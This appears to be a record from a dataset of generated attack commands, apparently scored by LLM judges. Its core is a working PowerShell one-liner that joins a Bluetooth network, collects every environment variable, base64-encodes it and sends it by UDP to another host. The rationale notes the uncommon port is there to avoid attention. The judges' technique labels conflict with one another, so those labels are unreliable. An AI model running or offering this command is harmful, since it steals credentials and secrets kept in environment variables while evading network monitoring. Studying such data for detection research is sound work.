command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()
explanation: Sends base64-encoded environment data via UDP over a Bluetooth-only subnet, ensuring all traffic uses the alternate Bluetooth medium (T1011).
rationale_steps: Connect to Bluetooth NAP to establish the alternate network medium.
Set a restricted IP on the Bluetooth adapter via netsh.
Bind UDP socket to the Bluetooth IP to force medium use.
Transmit to a high, uncommon UDP port to minimize attention.

llm_judgments.syntactic_justification: Well-formed PowerShell one-liner with balanced quotes/parentheses, valid separators, and correct invocation/assignment syntax.
llm_judgments.semantic_justification: It sends base64 data over a Bluetooth PAN via UDP but does not implement covert signaling as described for T1011 and likely requires admin rights for netsh plus a questionable BluetoothCL connect, reducing operational plausibility.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax, balanced elements, and valid external command arguments.
llm_judgments.semantic_justification: The command successfully demonstrates the claimed intent by connecting to a Bluetooth device, configuring a static IP on the resulting PAN interface, encoding environment data, and exfiltrating it via UDP over that dedicated Bluetooth channel, directly implementing T1011 Traffic Signaling using an alternate medium, despite `netsh` typically requiring elevated privileges which contradicts the stated 'Privilege: None'.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and method calls.
llm_judgments.semantic_justification: The command fully implements the T1011 technique by establishing a Bluetooth PAN connection, configuring a private IP subnet, and using UDP to exfiltrate base64-encoded environment data over this alternative communication channel.
